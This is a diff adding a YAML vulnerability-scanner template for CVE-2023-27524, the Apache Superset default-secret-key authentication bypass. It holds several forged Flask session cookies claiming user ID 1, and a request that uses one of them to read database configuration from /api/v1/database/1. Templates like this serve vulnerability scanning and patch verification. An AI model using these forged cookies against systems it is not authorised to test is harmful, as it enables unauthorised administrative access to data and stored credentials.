@@ -1,0 +1,39 @@
+id: poc-yaml-apache-superset-authentication-bypass
+info:
+  name: Apache Superset 会话认证漏洞(CVE-2023-27524)
+  severity: critical
+  tags:
+  - 两高一弱
+  - 不安全的初始化
+  - CVE-2023-27524
+  finger: superset
+  fofa: Apache Superset
+variables:
+  session: 'eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZKFnng.XPeCvkBiP7rOv1PhgKZ8xkzi2jk
+
+    eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZKFu3g.k_WNoBY1ouhQyOXa5UcYdjVVuq0
+
+    eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZKG_fg.KalpJbMq1SZPCBuunG9-ycDX9HM
+
+    eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZKG_zQ.FPiBfT39gn2slf--XZHsk0rByEY
+
+    eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZKHAPQ.zRjwotMHJES3eW8fJH8F_5GlD-U'
+firstRequest:
+  method: GET
+  path: /login/
+  expression: 'contains(body, "Apache Superset")
+
+    '
+requests:
+- method: GET
+  path: /api/v1/database/1
+  headers:
+    Cookie: session={{.session}}
+  expression: 'status_code == 200 &&
+
+    contains(body,"configuration_method\":") &&
+
+    contains(body,"database_name\":")
+
+    '
+transport: http
